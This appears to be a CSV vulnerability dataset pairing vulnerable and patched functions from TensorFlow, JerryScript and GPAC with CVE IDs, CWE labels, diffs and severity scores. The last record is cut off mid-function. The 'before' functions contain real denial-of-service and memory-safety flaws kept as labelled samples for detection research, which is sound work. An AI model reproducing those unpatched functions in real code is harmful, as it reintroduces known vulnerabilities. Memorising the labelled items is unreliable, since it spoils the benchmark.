cve_id,cwe_ids,cvss_vector,cvss_is_v3,repo_name,commit_msg,commit_hash,git_url,file_path,func_name,func_before,abstract_func_before,func_graph_path_before,func,abstract_func,func_graph_path,diff_func,diff_line_info,is_vul,description,Base Score,Base Severity,severity,source,commit_time,task
CVE-2022-21737,['CWE-754'],AV:N/AC:L/Au:S/C:N/I:N/A:P,0,tensorflow,"Fix check-fail when bincount ops are passed invalid values.

PiperOrigin-RevId: 415063028
Change-Id: I20f8dc09933ddca1111c4efbf9a3a1e863215d02",7019ce4f68925fd01cdafde26f8d8c938f47e6f9,https://github.com/tensorflow/tensorflow/commit/7019ce4f68925fd01cdafde26f8d8c938f47e6f9,tensorflow/core/kernels/bincount_op.cc,Compute,"void Compute(OpKernelContext* ctx) override {
const auto splits = ctx->input(0).flat<int64_t>();
const auto values = ctx->input(1).flat<Tidx>();
const Tensor& size_t = ctx->input(2);
const auto weights = ctx->input(3).flat<T>();
const int64_t weights_size = weights.size();
Tidx size = size_t.scalar<Tidx>()();
OP_REQUIRES(
ctx, size >= 0,
errors::InvalidArgument(""size ("", size, "") must be non-negative""));
int num_rows = splits.size() - 1;
int num_values = values.size();
int batch_idx = 0;
OP_REQUIRES(ctx, splits(0) == 0,
errors::InvalidArgument(""Splits must start with 0, not with "",
splits(0)));
OP_REQUIRES(ctx, splits(num_rows) == num_values,
errors::InvalidArgument(
""Splits must end with the number of values, got "",
splits(num_rows), "" instead of "", num_values));
Tensor* out_t;
OP_REQUIRES_OK(
ctx, ctx->allocate_output(0, TensorShape({num_rows, size}), &out_t));
functor::SetZeroFunctor<Device, T> fill;
fill(ctx->eigen_device<Device>(), out_t->flat<T>());
const auto out = out_t->matrix<T>();
for (int idx = 0; idx < num_values; ++idx) {
while (idx >= splits(batch_idx)) {
batch_idx++;
}
Tidx bin = values(idx);
OP_REQUIRES(ctx, bin >= 0,
errors::InvalidArgument(""Input must be non-negative""));
if (bin < size) {
if (binary_output_) {
out(batch_idx - 1, bin) = T(1);
} else {
T value = (weights_size > 0) ? weights(idx) : T(1);
out(batch_idx - 1, bin) += value;
}
}
}
}","void Compute(OpKernelContext* VAR_0) override {
const auto VAR_1 = VAR_0->input(0).flat<int64_t>();
const auto VAR_2 = VAR_0->input(1).flat<Tidx>();
const Tensor& VAR_3 = VAR_0->input(2);
const auto VAR_4 = VAR_0->input(3).flat<T>();
const int64_t VAR_5 = VAR_4.size();
Tidx VAR_6 = size_t.scalar<Tidx>()();
OP_REQUIRES(
VAR_0, VAR_6 >= 0,
errors::InvalidArgument(""size ("", VAR_6, "") must be non-negative""));
int VAR_7 = VAR_1.size() - 1;
int VAR_8 = VAR_2.size();
int VAR_9 = 0;
OP_REQUIRES(VAR_0, VAR_1(0) == 0,
errors::InvalidArgument(""Splits must start with 0, not with "",
VAR_1(0)));
OP_REQUIRES(VAR_0, VAR_1(VAR_7) == VAR_8,
errors::InvalidArgument(
""Splits must end with the number of values, got "",
VAR_1(VAR_7), "" instead of "", VAR_8));
Tensor* VAR_10;
OP_REQUIRES_OK(
VAR_0, VAR_0->allocate_output(0, TensorShape({VAR_7, VAR_6}), &VAR_10));
functor::SetZeroFunctor<Device, T> VAR_11;
VAR_11(VAR_0->eigen_device<Device>(), VAR_10->flat<T>());
const auto VAR_12 = VAR_10->matrix<T>();
for (int VAR_13 = 0; VAR_13 < VAR_8; ++VAR_13) {
while (VAR_13 >= VAR_1(VAR_9)) {
VAR_9++;
}
Tidx VAR_14 = VAR_2(VAR_13);
OP_REQUIRES(VAR_0, VAR_14 >= 0,
errors::InvalidArgument(""Input must be non-negative""));
if (VAR_14 < VAR_6) {
if (VAR_15) {
VAR_12(VAR_9 - 1, VAR_14) = T(1);
} else {
T VAR_16 = (VAR_5 > 0) ? VAR_4(VAR_13) : T(1);
VAR_12(VAR_9 - 1, VAR_14) += VAR_16;
}
}
}
}",,"void Compute(OpKernelContext* ctx) override {
    const auto splits = ctx->input(0).flat<int64_t>();
    const auto values = ctx->input(1).flat<Tidx>();
    const Tensor& size_t = ctx->input(2);
    const auto weights = ctx->input(3).flat<T>();
    const int64_t weights_size = weights.size();

    OP_REQUIRES(ctx, size_t.dims() == 0,
                errors::InvalidArgument(""Shape must be rank 0 but is rank "",
                                        size_t.dims()));
    Tidx size = size_t.scalar<Tidx>()();
    OP_REQUIRES(
        ctx, size >= 0,
        errors::InvalidArgument(""size ("", size, "") must be non-negative""));

    int num_rows = splits.size() - 1;
    int num_values = values.size();
    int batch_idx = 0;

    OP_REQUIRES(ctx, splits(0) == 0,
                errors::InvalidArgument(""Splits must start with 0, not with "",
                                        splits(0)));

    OP_REQUIRES(ctx, splits(num_rows) == num_values,
                errors::InvalidArgument(
                    ""Splits must end with the number of values, got "",
                    splits(num_rows), "" instead of "", num_values));

    Tensor* out_t;
    OP_REQUIRES_OK(
        ctx, ctx->allocate_output(0, TensorShape({num_rows, size}), &out_t));
    functor::SetZeroFunctor<Device, T> fill;
    fill(ctx->eigen_device<Device>(), out_t->flat<T>());
    const auto out = out_t->matrix<T>();

    for (int idx = 0; idx < num_values; ++idx) {
      while (idx >= splits(batch_idx)) {
        batch_idx++;
      }
      Tidx bin = values(idx);
      OP_REQUIRES(ctx, bin >= 0,
                  errors::InvalidArgument(""Input must be non-negative""));
      if (bin < size) {
        if (binary_output_) {
          out(batch_idx - 1, bin) = T(1);
        } else {
          T value = (weights_size > 0) ? weights(idx) : T(1);
          out(batch_idx - 1, bin) += value;
        }
      }
    }
  }","void Compute(OpKernelContext* VAR_0) override {
    const auto VAR_1 = VAR_0->input(0).flat<int64_t>();
    const auto VAR_2 = VAR_0->input(1).flat<Tidx>();
    const Tensor& VAR_3 = VAR_0->input(2);
    const auto VAR_4 = VAR_0->input(3).flat<T>();
    const int64_t VAR_5 = VAR_4.size();

    OP_REQUIRES(VAR_0, size_t.dims() == 0,
                errors::InvalidArgument(""Shape must be rank 0 but is rank "",
                                        size_t.dims()));
    Tidx VAR_6 = size_t.scalar<Tidx>()();
    OP_REQUIRES(
        VAR_0, VAR_6 >= 0,
        errors::InvalidArgument(""size ("", VAR_6, "") must be non-negative""));

    int VAR_7 = VAR_1.size() - 1;
    int VAR_8 = VAR_2.size();
    int VAR_9 = 0;

    OP_REQUIRES(VAR_0, VAR_1(0) == 0,
                errors::InvalidArgument(""Splits must start with 0, not with "",
                                        VAR_1(0)));

    OP_REQUIRES(VAR_0, VAR_1(VAR_7) == VAR_8,
                errors::InvalidArgument(
                    ""Splits must end with the number of values, got "",
                    VAR_1(VAR_7), "" instead of "", VAR_8));

    Tensor* VAR_10;
    OP_REQUIRES_OK(
        VAR_0, VAR_0->allocate_output(0, TensorShape({VAR_7, VAR_6}), &VAR_10));
    functor::SetZeroFunctor<Device, T> VAR_11;
    VAR_11(VAR_0->eigen_device<Device>(), VAR_10->flat<T>());
    const auto VAR_12 = VAR_10->matrix<T>();

    for (int VAR_13 = 0; VAR_13 < VAR_8; ++VAR_13) {
      while (VAR_13 >= VAR_1(VAR_9)) {
        VAR_9++;
      }
      Tidx VAR_14 = VAR_2(VAR_13);
      OP_REQUIRES(VAR_0, VAR_14 >= 0,
                  errors::InvalidArgument(""Input must be non-negative""));
      if (VAR_14 < VAR_6) {
        if (VAR_15) {
          VAR_12(VAR_9 - 1, VAR_14) = T(1);
        } else {
          T VAR_16 = (VAR_5 > 0) ? VAR_4(VAR_13) : T(1);
          VAR_12(VAR_9 - 1, VAR_14) += VAR_16;
        }
      }
    }
  }",,"--- func_before
+++ func_after
@@ -5,6 +5,9 @@
     const auto weights = ctx->input(3).flat<T>();
     const int64_t weights_size = weights.size();
 
+    OP_REQUIRES(ctx, size_t.dims() == 0,
+                errors::InvalidArgument(""Shape must be rank 0 but is rank "",
+                                        size_t.dims()));
     Tidx size = size_t.scalar<Tidx>()();
     OP_REQUIRES(
         ctx, size >= 0,","{'deleted_lines': [], 'added_lines': ['    OP_REQUIRES(ctx, size_t.dims() == 0,', '                errors::InvalidArgument(""Shape must be rank 0 but is rank "",', '                                        size_t.dims()));']}",True,"Tensorflow is an Open Source Machine Learning Framework. The implementation of `*Bincount` operations allows malicious users to cause denial of service by passing in arguments which would trigger a `CHECK`-fail. There are several conditions that the input arguments must satisfy. Some are not caught during shape inference and others are not caught during kernel implementation. This results in `CHECK` failures later when the output tensors get allocated. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",6.5,MEDIUM,1,valid,2021-12-08T20:01:53Z,4
CVE-2021-44992,['CWE-119'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,jerryscript-project/jerryscript,"Fix typedarray validation in Atomics read_modify_write

This patch fixes #4875.

JerryScript-DCO-1.0-Signed-off-by: Robert Fancsik robert.fancsik@h-lab.eu",18f73dd27ced9bcec1188c363f292fb471f0bd33,https://github.com/jerryscript-project/jerryscript/commit/18f73dd27ced9bcec1188c363f292fb471f0bd33,jerry-core/ecma/operations/ecma-atomics-object.c,ecma_validate_shared_integer_typedarray,"ecma_value_t
ecma_validate_shared_integer_typedarray (ecma_value_t typedarray, 
bool waitable) 
{
if (!ecma_is_value_object (typedarray))
{
return ecma_raise_type_error (ECMA_ERR_ARGUMENT_THIS_NOT_OBJECT);
}
ecma_object_t *typedarray_p = ecma_get_object_from_value (typedarray);
ecma_typedarray_info_t target_info = ecma_typedarray_get_info (typedarray_p);
if (waitable)
{
if (!(target_info.id == ECMA_BIGINT64_ARRAY || target_info.id == ECMA_INT32_ARRAY))
{
return ecma_raise_type_error (ECMA_ERR_ARGUMENT_NOT_SUPPORTED);
}
}
else
{
if (target_info.id == ECMA_UINT8_CLAMPED_ARRAY || target_info.id == ECMA_FLOAT32_ARRAY
|| target_info.id == ECMA_FLOAT64_ARRAY)
{
return ecma_raise_type_error (ECMA_ERR_ARGUMENT_NOT_SUPPORTED);
}
}
JERRY_ASSERT (target_info.array_buffer_p != NULL);
ecma_object_t *buffer = ecma_typedarray_get_arraybuffer (typedarray_p);
if (!ecma_object_class_is (buffer, ECMA_OBJECT_CLASS_SHARED_ARRAY_BUFFER))
{
return ecma_raise_type_error (ECMA_ERR_ARGUMENT_NOT_SHARED_ARRAY_BUFFER);
}
return ecma_make_object_value (buffer);
}","ecma_value_t
ecma_validate_shared_integer_typedarray (ecma_value_t VAR_0, 
bool VAR_1) 
{
if (!ecma_is_value_object (VAR_0))
{
return ecma_raise_type_error (VAR_2);
}
ecma_object_t *VAR_3 = ecma_get_object_from_value (VAR_0);
ecma_typedarray_info_t VAR_4 = ecma_typedarray_get_info (VAR_3);
if (VAR_1)
{
if (!(VAR_4.id == VAR_5 || VAR_4.id == VAR_6))
{
return ecma_raise_type_error (VAR_7);
}
}
else
{
if (VAR_4.id == VAR_8 || VAR_4.id == VAR_9
|| VAR_4.id == VAR_10)
{
return ecma_raise_type_error (VAR_7);
}
}
JERRY_ASSERT (VAR_4.array_buffer_p != NULL);
ecma_object_t *VAR_11 = ecma_typedarray_get_arraybuffer (VAR_3);
if (!ecma_object_class_is (VAR_11, VAR_12))
{
return ecma_raise_type_error (VAR_13);
}
return ecma_make_object_value (VAR_11);
}",jerryscript-project/jerryscript/18f73dd27ced9bcec1188c363f292fb471f0bd33/ecma-atomics-object.c/vul/before/0.json,"ecma_value_t
ecma_validate_shared_integer_typedarray (ecma_value_t typedarray, /**< typedArray argument */
                                         bool waitable) /**< waitable argument */
{
  /* 2. */
  if (!ecma_is_typedarray (typedarray))
  {
    return ecma_raise_type_error (ECMA_ERR_ARGUMENT_THIS_NOT_TYPED_ARRAY);
  }

  /* 3-4. */
  ecma_object_t *typedarray_p = ecma_get_object_from_value (typedarray);
  ecma_typedarray_info_t target_info = ecma_typedarray_get_info (typedarray_p);

  /* 5-6. */
  if (waitable)
  {
    if (!(target_info.id == ECMA_BIGINT64_ARRAY || target_info.id == ECMA_INT32_ARRAY))
    {
      return ecma_raise_type_error (ECMA_ERR_ARGUMENT_NOT_SUPPORTED);
    }
  }
  else
  {
    if (target_info.id == ECMA_UINT8_CLAMPED_ARRAY || target_info.id == ECMA_FLOAT32_ARRAY
        || target_info.id == ECMA_FLOAT64_ARRAY)
    {
      return ecma_raise_type_error (ECMA_ERR_ARGUMENT_NOT_SUPPORTED);
    }
  }

  /* 7. */
  JERRY_ASSERT (target_info.array_buffer_p != NULL);

  /* 8-10. */
  ecma_object_t *buffer = ecma_typedarray_get_arraybuffer (typedarray_p);

  if (!ecma_object_class_is (buffer, ECMA_OBJECT_CLASS_SHARED_ARRAY_BUFFER))
  {
    return ecma_raise_type_error (ECMA_ERR_ARGUMENT_NOT_SHARED_ARRAY_BUFFER);
  }

  return ecma_make_object_value (buffer);
}","ecma_value_t
ecma_validate_shared_integer_typedarray (ecma_value_t VAR_0, /* COMMENT_0 */
                                         bool VAR_1) /* COMMENT_1 */
{
  /* COMMENT_2 */
  if (!ecma_is_typedarray (VAR_0))
  {
    return ecma_raise_type_error (VAR_2);
  }

  /* COMMENT_3 */
  ecma_object_t *VAR_3 = ecma_get_object_from_value (VAR_0);
  ecma_typedarray_info_t VAR_4 = ecma_typedarray_get_info (VAR_3);

  /* COMMENT_4 */
  if (VAR_1)
  {
    if (!(VAR_4.id == VAR_5 || VAR_4.id == VAR_6))
    {
      return ecma_raise_type_error (VAR_7);
    }
  }
  else
  {
    if (VAR_4.id == VAR_8 || VAR_4.id == VAR_9
        || VAR_4.id == VAR_10)
    {
      return ecma_raise_type_error (VAR_7);
    }
  }

  /* COMMENT_5 */
  JERRY_ASSERT (VAR_4.array_buffer_p != NULL);

  /* COMMENT_6 */
  ecma_object_t *VAR_11 = ecma_typedarray_get_arraybuffer (VAR_3);

  if (!ecma_object_class_is (VAR_11, VAR_12))
  {
    return ecma_raise_type_error (VAR_13);
  }

  return ecma_make_object_value (VAR_11);
}",jerryscript-project/jerryscript/18f73dd27ced9bcec1188c363f292fb471f0bd33/ecma-atomics-object.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -3,9 +3,9 @@
                                          bool waitable) /**< waitable argument */
 {
   /* 2. */
-  if (!ecma_is_value_object (typedarray))
+  if (!ecma_is_typedarray (typedarray))
   {
-    return ecma_raise_type_error (ECMA_ERR_ARGUMENT_THIS_NOT_OBJECT);
+    return ecma_raise_type_error (ECMA_ERR_ARGUMENT_THIS_NOT_TYPED_ARRAY);
   }
 
   /* 3-4. */","{'deleted_lines': ['  if (!ecma_is_value_object (typedarray))', '    return ecma_raise_type_error (ECMA_ERR_ARGUMENT_THIS_NOT_OBJECT);'], 'added_lines': ['  if (!ecma_is_typedarray (typedarray))', '    return ecma_raise_type_error (ECMA_ERR_ARGUMENT_THIS_NOT_TYPED_ARRAY);']}",True,There is an Assertion ''ecma_object_is_typedarray (obj_p)'' failed at /jerry-core/ecma/operations/ecma-typedarray-object.c in Jerryscript 3.0.0.,5.5,MEDIUM,1,valid,2021-12-09T11:01:00Z,4
CVE-2021-45292,['CWE-476'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #1958,3dafcb5e71e9ffebb50238784dcad8b105da81f6,https://github.com/gpac/gpac/commit/3dafcb5e71e9ffebb50238784dcad8b105da81f6,src/isomedia/box_funcs.c,gf_isom_box_parse_ex,"GF_Err gf_isom_box_parse_ex(GF_Box **outBox, GF_BitStream *bs, u32 parent_type, Bool is_root_box)
{
u32 type, uuid_type, hdr_size, restore_type;
u64 size, start, comp_start, end;
char uuid[16];
GF_Err e;
GF_BitStream *uncomp_bs = NULL;
u8 *uncomp_data = NULL;
u32 compressed_size=0;
GF_Box *newBox;
Bool skip_logs = (gf_bs_get_cookie(bs) & GF_ISOM_BS_COOKIE_NO_LOGS ) ? GF_TRUE : GF_FALSE;
Bool is_special = GF_TRUE;
if ((bs == NULL) || (outBox == NULL) ) return GF_BAD_PARAM;
*outBox = NULL;
if (gf_bs_available(bs) < 8) {
return GF_ISOM_INCOMPLETE_FILE;
}
comp_start = start = gf_bs_get_position(bs);
uuid_type = 0;
size = (u64) gf_bs_read_u32(bs);
hdr_size = 4;
if ((size >= 2) && (size <= 4)) {
size = 4;
type = GF_ISOM_BOX_TYPE_VOID;
} else {
type = gf_bs_read_u32(bs);
hdr_size += 4;
if (type == GF_ISOM_BOX_TYPE_TOTL)
size = 12;
if (!size) {
if (is_root_box) {
if (!skip_logs) {
GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Warning Read Box type %s (0x%08X) size 0 reading till the end of file\n"", gf_4cc_to_str(type), type));
}
size = gf_bs_available(bs) + 8;
} else {
if (!skip_logs) {
GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Read Box type %s (0x%08X) at position ""LLU"" has size 0 but is not at root/file level, skipping\n"", gf_4cc_to_str(type), type, start));
}
return GF_OK;
}
}
if (is_root_box && (size>=8)) {
Bool do_uncompress = GF_FALSE;
u8 *compb = NULL;
u32 osize = 0;
u32 otype = type;
if (type==GF_4CC('!', 'm', 'o', 'f')) {
do_uncompress = GF_TRUE;
type = GF_ISOM_BOX_TYPE_MOOF;
}
else if (type==GF_4CC('!', 'm', 'o', 'v')) {
do_uncompress = GF_TRUE;
type = GF_ISOM_BOX_TYPE_MOOV;
}
else if (type==GF_4CC('!', 's', 'i', 'x')) {
do_uncompress = GF_TRUE;
type = GF_ISOM_BOX_TYPE_SIDX;
}
else if (type==GF_4CC('!', 's', 's', 'x')) {
do_uncompress = GF_TRUE;
type = GF_ISOM_BOX_TYPE_SSIX;
}
if (do_uncompress) {
compb = gf_malloc((u32) (size-8));
compressed_size = (u32) (size - 8);
gf_bs_read_data(bs, compb, compressed_size);
e = gf_gz_decompress_payload(compb, compressed_size, &uncomp_data, &osize);
if (e) {
GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Failed to uncompress payload for box type %s (0x%08X)\n"", gf_4cc_to_str(otype), otype));
return e;
}
size = osize + 8;
uncomp_bs = gf_bs_new(uncomp_data, osize, GF_BITSTREAM_READ);
bs = uncomp_bs;
start = 0;
gf_free(compb);
}
}
}
memset(uuid, 0, 16);
if (type == GF_ISOM_BOX_TYPE_UUID ) {
if (gf_bs_available(bs) < 16) {
return GF_ISOM_INCOMPLETE_FILE;
}
gf_bs_read_data(bs, uuid, 16);
hdr_size += 16;
uuid_type = gf_isom_solve_uuid_box(uuid);
}
if (size == 1) {
if (gf_bs_available(bs) < 8) {
return GF_ISOM_INCOMPLETE_FILE;
}
size = gf_bs_read_u64(bs);
hdr_size += 8;
}
if (!skip_logs)
GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Read Box type %s size ""LLD"" start ""LLD""\n"", gf_4cc_to_str(type), size,  start));
if ( size < hdr_size ) {
GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Box size ""LLD"" less than box header size %d\n"", size, hdr_size));
return GF_ISOM_INVALID_FILE;
}
restore_type = 0;
if ((parent_type==GF_ISOM_BOX_TYPE_STSD) && (type==GF_QT_SUBTYPE_RAW) ) {
u64 cookie = gf_bs_get_cookie(bs);
restore_type = type;
if (cookie & GF_ISOM_BS_COOKIE_VISUAL_TRACK)
type = GF_QT_SUBTYPE_RAW_VID;
else
type = GF_QT_SUBTYPE_RAW_AUD;
}
if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_TREF)) {
newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_REFT);
if (!newBox) return GF_OUT_OF_MEM;
((GF_TrackReferenceTypeBox*)newBox)->reference_type = type;
} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_IREF)) {
newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_REFI);
if (!newBox) return GF_OUT_OF_MEM;
((GF_ItemReferenceTypeBox*)newBox)->reference_type = type;
} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_TRGR)) {
newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_TRGT);
if (!newBox) return GF_OUT_OF_MEM;
((GF_TrackGroupTypeBox*)newBox)->group_type = type;
} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_GRPL)) {
newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_GRPT);
if (!newBox) return GF_OUT_OF_MEM;
((GF_EntityToGroupTypeBox*)newBox)->grouping_type = type;
} else {
is_special = GF_FALSE;
newBox = gf_isom_box_new_ex(uuid_type ? uuid_type : type, parent_type, skip_logs, is_root_box);
if (!newBox) return GF_OUT_OF_MEM;
}
if (type==GF_ISOM_BOX_TYPE_UUID && !is_special) {
memcpy(((GF_UUIDBox *)newBox)->uuid, uuid, 16);
((GF_UUIDBox *)newBox)->internal_4cc = uuid_type;
}
if (!newBox->type) newBox->type = type;
if (restore_type)
newBox->type = restore_type;
end = gf_bs_available(bs);
if (size - hdr_size > end ) {
newBox->size = size - hdr_size - end;
*outBox = newBox;
return GF_ISOM_INCOMPLETE_FILE;
}
newBox->size = size - hdr_size;
e = gf_isom_full_box_read(newBox, bs);
if (!e) e = gf_isom_box_read(newBox, bs);
if (e) {
if (gf_opts_get_bool(""core"", ""no-check""))
e = GF_OK;
}
newBox->size = size;
end = gf_bs_get_position(bs);
if (uncomp_bs) {
gf_free(uncomp_data);
gf_bs_del(uncomp_bs);
if (e) {
gf_isom_box_del(newBox);
*outBox = NULL;
return e;
}
size -= 8;
if (type==GF_ISOM_BOX_TYPE_MOOF) {
((GF_MovieFragmentBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
}
else if (type==GF_ISOM_BOX_TYPE_MOOV) {
((GF_MovieBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
((GF_MovieBox *)newBox)->file_offset = comp_start;
}
else if (type==GF_ISOM_BOX_TYPE_SIDX) {
((GF_SegmentIndexBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
}
else if (type==GF_ISOM_BOX_TYPE_SSIX) {
((GF_SubsegmentIndexBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
}
newBox->internal_flags = GF_ISOM_BOX_COMPRESSED;
}
if (e && (e != GF_ISOM_INCOMPLETE_FILE)) {
gf_isom_box_del(newBox);
*outBox = NULL;
if (!skip_logs) {
GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Read Box \""%s\"" (start ""LLU"") failed (%s) - skipping\n"", gf_4cc_to_str(type), start, gf_error_to_string(e)));
}
return e;
}
if (end-start > size) {
if (!skip_logs) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] Box \""%s\"" size ""LLU"" (start ""LLU"") invalid (read ""LLU"")\n"", gf_4cc_to_str(type), size, start, (end-start) ));
}
gf_bs_seek(bs, start+size);
} else if (end-start < size) {
u32 to_skip = (u32) (size-(end-start));
if (!skip_logs) {
if ((to_skip!=4) || gf_bs_peek_bits(bs, 32, 0)) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] Box \""%s\"" (start ""LLU"") has %u extra bytes\n"", gf_4cc_to_str(type), start, to_skip));
unused_bytes += to_skip;
}
}
gf_bs_skip_bytes(bs, to_skip);
}
*outBox = newBox;
return e;
}","GF_Err gf_isom_box_parse_ex(GF_Box **VAR_0, GF_BitStream *VAR_1, u32 VAR_2, Bool VAR_3)
{
u32 VAR_4, VAR_5, VAR_6, VAR_7;
u64 VAR_8, VAR_9, VAR_10, VAR_11;
char VAR_12[16];
GF_Err VAR_13;
GF_BitStream *VAR_14 = NULL;
u8 *VAR_15 = NULL;
u32 VAR_16=0;
GF_Box *VAR_17;
Bool VAR_18 = (gf_bs_get_cookie(VAR_1) & VAR_19 ) ? VAR_20 : VAR_21;
Bool VAR_22 = VAR_20;
if ((VAR_1 == NULL) || (VAR_0 == NULL) ) return VAR_23;
*VAR_0 = NULL;
if (gf_bs_available(VAR_1) < 8) {
return VAR_24;
}
VAR_10 = VAR_9 = gf_bs_get_position(VAR_1);
VAR_5 = 0;
VAR_8 = (u64) gf_bs_read_u32(VAR_1);
VAR_6 = 4;
if ((VAR_8 >= 2) && (VAR_8 <= 4)) {
VAR_8 = 4;
VAR_4 = VAR_25;
} else {
VAR_4 = gf_bs_read_u32(VAR_1);
VAR_6 += 4;
if (VAR_4 == VAR_26)
VAR_8 = 12;
if (!VAR_8) {
if (VAR_3) {
if (!VAR_18) {
GF_LOG(VAR_27, VAR_28, (""[iso file] Warning Read Box type %s (0x%08X) size 0 reading till the end of file\n"", gf_4cc_to_str(VAR_4), VAR_4));
}
VAR_8 = gf_bs_available(VAR_1) + 8;
} else {
if (!VAR_18) {
GF_LOG(VAR_29, VAR_28, (""[iso file] Read Box type %s (0x%08X) at position ""VAR_30"" has size 0 but is not at root/file level, skipping\n"", gf_4cc_to_str(VAR_4), VAR_4, VAR_9));
}
return VAR_31;
}
}
if (VAR_3 && (VAR_8>=8)) {
Bool VAR_32 = VAR_21;
u8 *VAR_33 = NULL;
u32 VAR_34 = 0;
u32 VAR_35 = VAR_4;
if (VAR_4==GF_4CC('!', 'm', 'o', 'f')) {
VAR_32 = VAR_20;
VAR_4 = VAR_36;
}
else if (VAR_4==GF_4CC('!', 'm', 'o', 'v')) {
VAR_32 = VAR_20;
VAR_4 = VAR_37;
}
else if (VAR_4==GF_4CC('!', 's', 'i', 'x')) {
VAR_32 = VAR_20;
VAR_4 = VAR_38;
}
else if (VAR_4==GF_4CC('!', 's', 's', 'x')) {
VAR_32 = VAR_20;
VAR_4 = VAR_39;
}
if (VAR_32) {
VAR_33 = gf_malloc((u32) (VAR_8-8));
VAR_16 = (u32) (VAR_8 - 8);
gf_bs_read_data(VAR_1, VAR_33, VAR_16);
VAR_13 = gf_gz_decompress_payload(VAR_33, VAR_16, &VAR_15, &VAR_34);
if (VAR_13) {
GF_LOG(VAR_29, VAR_28, (""[iso file] Failed to uncompress payload for box type %s (0x%08X)\n"", gf_4cc_to_str(VAR_35), VAR_35));
return VAR_13;
}
VAR_8 = VAR_34 + 8;
VAR_14 = gf_bs_new(VAR_15, VAR_34, VAR_40);
VAR_1 = VAR_14;
VAR_9 = 0;
gf_free(VAR_33);
}
}
}
memset(VAR_12, 0, 16);
if (VAR_4 == VAR_41 ) {
if (gf_bs_available(VAR_1) < 16) {
return VAR_24;
}
gf_bs_read_data(VAR_1, VAR_12, 16);
VAR_6 += 16;
VAR_5 = gf_isom_solve_uuid_box(VAR_12);
}
if (VAR_8 == 1) {
if (gf_bs_available(VAR_1) < 8) {
return VAR_24;
}
VAR_8 = gf_bs_read_u64(VAR_1);
VAR_6 += 8;
}
if (!VAR_18)
GF_LOG(VAR_27, VAR_28, (""[iso file] Read Box type %s size ""VAR_42"" start ""VAR_42""\n"", gf_4cc_to_str(VAR_4), VAR_8,  VAR_9));
if ( VAR_8 < VAR_6 ) {
GF_LOG(VAR_27, VAR_28, (""[iso file] Box size ""VAR_42"" less than box header size %d\n"", VAR_8, VAR_6));
return VAR_43;
}
VAR_7 = 0;
if ((VAR_2==VAR_44) && (VAR_4==VAR_45) ) {
u64 VAR_46 = gf_bs_get_cookie(VAR_1);
VAR_7 = VAR_4;
if (VAR_46 & VAR_47)
VAR_4 = VAR_48;
else
VAR_4 = VAR_49;
}
if (VAR_2 && (VAR_2 == VAR_50)) {
VAR_17 = gf_isom_box_new(VAR_51);
if (!VAR_17) return VAR_52;
((GF_TrackReferenceTypeBox*)VAR_17)->reference_type = VAR_4;
} else if (VAR_2 && (VAR_2 == VAR_53)) {
VAR_17 = gf_isom_box_new(VAR_54);
if (!VAR_17) return VAR_52;
((GF_ItemReferenceTypeBox*)VAR_17)->reference_type = VAR_4;
} else if (VAR_2 && (VAR_2 == VAR_55)) {
VAR_17 = gf_isom_box_new(VAR_56);
if (!VAR_17) return VAR_52;
((GF_TrackGroupTypeBox*)VAR_17)->group_type = VAR_4;
} else if (VAR_2 && (VAR_2 == VAR_57)) {
VAR_17 = gf_isom_box_new(VAR_58);
if (!VAR_17) return VAR_52;
((GF_EntityToGroupTypeBox*)VAR_17)->grouping_type = VAR_4;
} else {
VAR_22 = VAR_21;
VAR_17 = gf_isom_box_new_ex(VAR_5 ? VAR_5 : VAR_4, VAR_2, VAR_18, VAR_3);
if (!VAR_17) return VAR_52;
}
if (VAR_4==VAR_41 && !VAR_22) {
memcpy(((GF_UUIDBox *)VAR_17)->uuid, VAR_12, 16);
((GF_UUIDBox *)VAR_17)->internal_4cc = VAR_5;
}
if (!VAR_17->type) VAR_17->type = VAR_4;
if (VAR_7)
VAR_17->type = VAR_7;
VAR_11 = gf_bs_available(VAR_1);
if (VAR_8 - VAR_6 > VAR_11 ) {
VAR_17->size = VAR_8 - VAR_6 - VAR_11;
*VAR_0 = VAR_17;
return VAR_24;
}
VAR_17->size = VAR_8 - VAR_6;
VAR_13 = gf_isom_full_box_read(VAR_17, VAR_1);
if (!VAR_13) VAR_13 = gf_isom_box_read(VAR_17, VAR_1);
if (VAR_13) {
if (gf_opts_get_bool(""core"", ""no-check""))
VAR_13 = VAR_31;
}
VAR_17->size = VAR_8;
VAR_11 = gf_bs_get_position(VAR_1);
if (VAR_14) {
gf_free(VAR_15);
gf_bs_del(VAR_14);
if (VAR_13) {
gf_isom_box_del(VAR_17);
*VAR_0 = NULL;
return VAR_13;
}
VAR_8 -= 8;
if (VAR_4==VAR_36) {
((GF_MovieFragmentBox *)VAR_17)->compressed_diff = (s32)VAR_8 - (s32)VAR_16;
}
else if (VAR_4==VAR_37) {
((GF_MovieBox *)VAR_17)->compressed_diff = (s32)VAR_8 - (s32)VAR_16;
((GF_MovieBox *)VAR_17)->file_offset = VAR_10;
}
else if (VAR_4==VAR_38) {
